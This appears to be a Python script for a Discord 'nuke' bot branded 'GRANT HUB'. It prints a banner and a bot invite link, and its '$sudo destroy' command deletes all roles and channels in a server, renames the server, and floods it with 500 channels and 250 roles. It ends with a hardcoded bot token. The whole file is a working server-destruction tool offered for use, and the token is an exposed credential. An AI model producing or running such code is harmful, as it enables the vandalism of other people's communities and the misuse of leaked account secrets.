print("		                                                                 ")
print("░██████╗░██████╗░░█████╗░███╗░░██╗████████╗  ██╗░░██╗██╗░░░██╗██████╗░")
print("██╔════╝░██╔══██╗██╔══██╗████╗░██║╚══██╔══╝  ██║░░██║██║░░░██║██╔══██╗")
print("██║░░██╗░██████╔╝███████║██╔██╗██║░░░██║░░░  ███████║██║░░░██║██████╦╝")
print("██║░░╚██╗██╔══██╗██╔══██║██║╚████║░░░██║░░░  ██╔══██║██║░░░██║██╔══██╗")
print("╚██████╔╝██║░░██║██║░░██║██║░╚███║░░░██║░░░  ██║░░██║╚██████╔╝██████╦╝")
print("░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░  ╚═╝░░╚═╝░╚═════╝░╚═════╝░")
print("https://discord.com/api/oauth2/authorize?client_id=984435101154807889&permissions=268435504&scope=bot")
import discord
from discord.ext import commands
from discord.utils import get
texts = "GrantHubNo1"
bot = commands.Bot(command_prefix="$sudo ", cas_insentive=True, help_command=None)
text = texts
name = text
names = name
@bot.command()
async def destroy(ctx):
    guild = ctx.message.guild
    for role in ctx.guild.roles:  
        try:  
            await role.delete()
            print("Delete Role")
        except:
            pass
    try:
        print("Change Server Name")
        await ctx.guild.edit(name=name)
    except:
        pass
    for c in ctx.guild.channels:
        try:  
            await c.delete() 
            print("Delete Channel")
        except:
            pass
    for i in range(500):
        try:
            await guild.create_text_channel(name)
            print("Create Channel")
        except:
            pass
    for i in range(250):
        try:
            await guild.create_role(name=names)
            print("Create Role")
        except:
            pass
    print("Nuke Suscess")
bot.run('OTg0NDM1MTAxMTU0ODA3ODg5.GxpnnB.IOl39z_boz69Xu_c5gxC6vCFsEce1WMhJRvN3I')
